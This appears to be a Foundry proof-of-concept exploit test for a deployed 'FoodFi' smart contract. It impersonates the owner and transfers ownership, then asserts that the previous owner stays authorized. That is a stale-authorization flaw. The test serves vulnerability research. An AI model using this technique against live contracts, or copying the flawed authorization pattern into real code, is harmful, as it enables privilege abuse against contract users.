pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IFoodFi {
    function transferOwnership(address payable adr) external;
    function isAuthorized(address adr) external view returns (bool);
    function isOwner(address account) external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x100F770A25Af4c2ec5f3DAdF47A329b2abaA8eEf;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        vm.label(TARGET, "FoodFi Contract");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Step 1: Read current owner from storage slot 0
        bytes32 ownerSlot = vm.load(TARGET, bytes32(uint256(0)));
        address previousOwner = address(uint160(uint256(ownerSlot)));
        vm.label(previousOwner, "Previous Owner");

        // Step 2: Impersonate the current owner
        vm.startPrank(previousOwner);

        // Step 3: Transfer ownership to attacker (or any new address)
        IFoodFi(TARGET).transferOwnership(payable(attacker));

        // Step 4: Stop prank
        vm.stopPrank();

        // Step 5: Verify the vulnerability - previous owner is STILL authorized
        bool isPreviousOwnerAuthorized = IFoodFi(TARGET).isAuthorized(previousOwner);

        // Oracle verification: previous owner's authorization status should remain true
        assertEq(isPreviousOwnerAuthorized, true, "VULNERABILITY: Previous owner should still be authorized after ownership transfer");

        // Additional verification: confirm ownership actually changed
        bool isAttackerOwner = IFoodFi(TARGET).isOwner(attacker);
        assertEq(isAttackerOwner, true, "Ownership should have transferred to attacker");
        assertEq(IFoodFi(TARGET).isAuthorized(previousOwner), true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

